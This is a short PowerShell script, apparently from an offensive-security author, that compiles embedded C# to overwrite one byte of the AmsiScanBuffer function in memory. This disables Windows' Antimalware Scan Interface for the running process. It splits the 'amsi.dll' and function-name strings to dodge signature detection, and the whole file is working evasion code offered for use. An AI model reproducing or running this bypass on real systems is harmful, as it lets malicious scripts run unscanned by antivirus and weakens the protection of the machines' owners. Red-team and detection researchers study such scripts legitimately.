<#
.SYNOPSIS
   patch-amsi-current-process

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.1.1
   
.DESCRIPTION
   disable AMSI within current process

.EXAMPLE
   PS C:\> .\patch-amsi-x64-powershell.ps1
   disable AMSI within current process

.INPUTS
   None. You cannot pipe objects into patch-amsi-x64-powershell.ps1

.OUTPUTS
   32
#>

$data = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class Program
{
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
	public static void Run()
	{
		IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
		IntPtr amsi = GetProcAddress(lib, "Am"+"s"+"iScan"+"B"+"uffer");
		IntPtr final = IntPtr.Add(amsi, 0x95);
		uint old = 0;
		VirtualProtect(final, (UInt32)0x1, 0x40, out old);

		Console.WriteLine(old);
		byte[] patch = new byte[] { 0x75 };

		Marshal.Copy(patch, 0, final, 1);

		VirtualProtect(final, (UInt32)0x1, old, out old);
	}
}
"@

Add-Type $data -Language CSharp 

[Program]::Run()